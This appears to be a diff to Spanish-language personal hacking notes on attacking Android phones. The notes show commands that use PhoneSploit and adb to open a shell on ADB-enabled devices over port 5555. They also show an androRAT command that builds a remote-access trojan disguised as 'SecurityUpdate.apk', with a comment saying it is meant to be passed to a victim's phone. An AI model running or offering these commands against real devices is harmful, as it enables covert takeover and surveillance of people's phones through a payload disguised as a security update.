@@ -5,8 +5,10 @@ Tags: #Hacking #Android #Ñ
 ## PhoneSploit
 
 ```bash 
-# Kali Tool para conectarse a un celular Android a la PC con el 'ADB-enabled' y análisis binario 
-❯ python3 -m pip install colorama  
+# Kali Tool para conectarse a un celular Android a la PC con el 'ADB-enabled' y análisis binario  
+❯ apt install adb        # Instalar la herramienta 
+❯ git clone https://github.com/prbhtkumr/PhoneSploit/tree/master   # Descargar la tool 
+❯ python3 -m pip install colorama 
 
 Nota:
 	1. El puerto al que se debe de conectar el es 5555
@@ -43,7 +45,6 @@ Nota:
 
 ```bash 
 # Powershell Tool para conectarse a un celular Android a la PC con el 'ADB-enabled'
-
 ❯ adb devices            # Mirar los dispositivos disponibles para la conexión
 ❯ adb connect IP:5555    # Cenectar al dispositivo Android 
 ❯ adb shell              # Obtener una shell del dispositivo
@@ -110,7 +111,7 @@ Nota:
 
 ```bash 
 # Kali Tool 
-❯ python3 androRAT.py --build -i IP -p 443 -o SecurityUpdate.apk    # Crear un APK malicioso 
+❯ python3 androRAT.py --build -i IP -p 443 -o SecurityUpdate.apk    # Crear un APK malicioso para pasarlo al android victima 
 
 	# o = Output 
 	# build = Es para construir el APK 
